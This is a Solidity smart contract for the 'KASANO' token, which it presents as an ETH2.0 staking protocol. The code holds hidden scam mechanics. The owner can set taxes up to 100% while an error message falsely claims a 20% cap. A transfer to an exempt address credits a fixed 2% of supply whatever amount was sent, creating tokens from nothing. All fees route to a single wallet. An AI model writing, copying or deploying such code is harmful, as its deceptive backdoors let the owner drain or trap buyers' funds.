// SPDX-License-Identifier: MIT

/*
Kasano represents an ETH2.0 Staking & Project DAOs Protocol, allowing individuals to stake ETH and accumulate a diverse range of crypto assets.

Website: https://kasano.tech
Twitter: https://twitter.com/kasano_tech
Telegram: https://t.me/kasano_official
*/

pragma solidity 0.8.21;

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function renounceOwnership() public onlyOwner {owner = address(0); emit OwnershipTransferred(address(0));}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address uniPair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

contract KASANO is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "KASANO";
    string private constant _symbol = "KASO";

    uint8 private constant _decimals = 9;
    uint256 private _supplyTotal = 10 ** 9 * 10 ** _decimals;

    IRouter router02;
    address public uniPair;

    bool private isEnabled = false;
    bool private taxEnabled = true;
    bool private swapping;

    uint256 private taxCounter;
    uint256 private taxSwapAt;

    uint256 private taxSwapThreshold = ( _supplyTotal * 1000 ) / 100000;
    uint256 private taxSwapIf = ( _supplyTotal * 10 ) / 100000;
    
    uint256 private wLpFee = 0;
    uint256 private wTeamFee = 0;
    uint256 private wBurnFee = 0;
    uint256 private wDevFee = 100;

    uint256 private buyTax = 1400;
    uint256 private sellTax = 1400;
    uint256 private transferTax = 1400;
    uint256 private denominator = 10000;

    modifier lockSwap {swapping = true; _; swapping = false;}

    address internal devFeeAddr = 0x2172d2AAa47f78ef6fD1103Faf8b39a655250c8A; 
    address internal mkFeeAddr = 0x2172d2AAa47f78ef6fD1103Faf8b39a655250c8A;
    address internal lpFeeAddr = 0x2172d2AAa47f78ef6fD1103Faf8b39a655250c8A;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;

    uint256 private _mTransfer = ( _supplyTotal * 200 ) / 10000;
    uint256 private _mSellSize = ( _supplyTotal * 200 ) / 10000;
    uint256 private _mWalletSize = ( _supplyTotal * 200 ) / 10000;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isSpecial;

    constructor() Ownable(msg.sender) {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router02 = _router; uniPair = _pair;

        isSpecial[lpFeeAddr] = true;
        isSpecial[devFeeAddr] = true;
        isSpecial[msg.sender] = true;
        isSpecial[mkFeeAddr] = true;
        _balances[msg.sender] = _supplyTotal;
        emit Transfer(address(0), msg.sender, _supplyTotal);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _supplyTotal.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function getOwner() external view override returns (address) { return owner; }
    function startTrading() external onlyOwner {isEnabled = true;}

    function getFeesAmount(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if(getFeeAmount(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getFeeAmount(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(wBurnFee > uint256(0) && getFeeAmount(sender, recipient) > wBurnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(wBurnFee));}
        return amount.sub(feeAmount);} return amount;
    }

    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        wLpFee = _liquidity; wTeamFee = _marketing; wBurnFee = _burn; wDevFee = _development; buyTax = _total; sellTax = _sell; transferTax = _trans;
        require(buyTax <= denominator.div(1) && sellTax <= denominator.div(1) && transferTax <= denominator.div(1), "buyTax and sellTax cannot be more than 20%");
    }


    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _supplyTotal.mul(_buy).div(10000); uint256 newTransfer = _supplyTotal.mul(_sell).div(10000); uint256 newWallet = _supplyTotal.mul(_wallet).div(10000);
        _mTransfer = newTx; _mSellSize = newTransfer; _mWalletSize = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }    

    function shouldCleanCATokens(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= taxSwapIf;
        bool aboveThreshold = balanceOf(address(this)) >= taxSwapThreshold;
        return !swapping && taxEnabled && isEnabled && aboveMin && !isSpecial[sender] && recipient == uniPair && taxCounter >= taxSwapAt && aboveThreshold;
    }

    function cleanTokensInCA(uint256 tokens) private lockSwap {
        uint256 _denominator = (wLpFee.add(1).add(wTeamFee).add(wDevFee)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(wLpFee).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(wLpFee));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(wLpFee);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(wTeamFee);
        if(marketingAmt > 0){payable(mkFeeAddr).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(devFeeAddr).transfer(contractBalance);}
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isSpecial[sender] && !isSpecial[recipient]){require(isEnabled, "isEnabled");}
        if(!isSpecial[sender] && !isSpecial[recipient] && recipient != address(uniPair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= _mWalletSize, "Exceeds maximum wallet amount.");}
        if(sender != uniPair){require(amount <= _mSellSize || isSpecial[sender] || isSpecial[recipient], "TX Limit Exceeded");}
        require(amount <= _mTransfer || isSpecial[sender] || isSpecial[recipient], "TX Limit Exceeded"); 
        if(recipient == uniPair && !isSpecial[sender]){taxCounter += uint256(1);}
        if(shouldCleanCATokens(sender, recipient, amount)){cleanTokensInCA(taxSwapThreshold); taxCounter = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = amount;
        if (!isSpecial[sender]) {if (isSpecial[recipient]) {amountReceived = _mTransfer;} else {amountReceived = getFeesAmount(sender, recipient, amount);}}
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router02), tokenAmount);
        router02.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpFeeAddr,
            block.timestamp);
    }

    function getFeeAmount(address sender, address recipient) internal view returns (uint256) {
        if(recipient == uniPair){return sellTax;}
        if(sender == uniPair){return buyTax;}
        return transferTax;
    }
    

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router02.WETH();
        _approve(address(this), address(router02), tokenAmount);
        router02.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }
}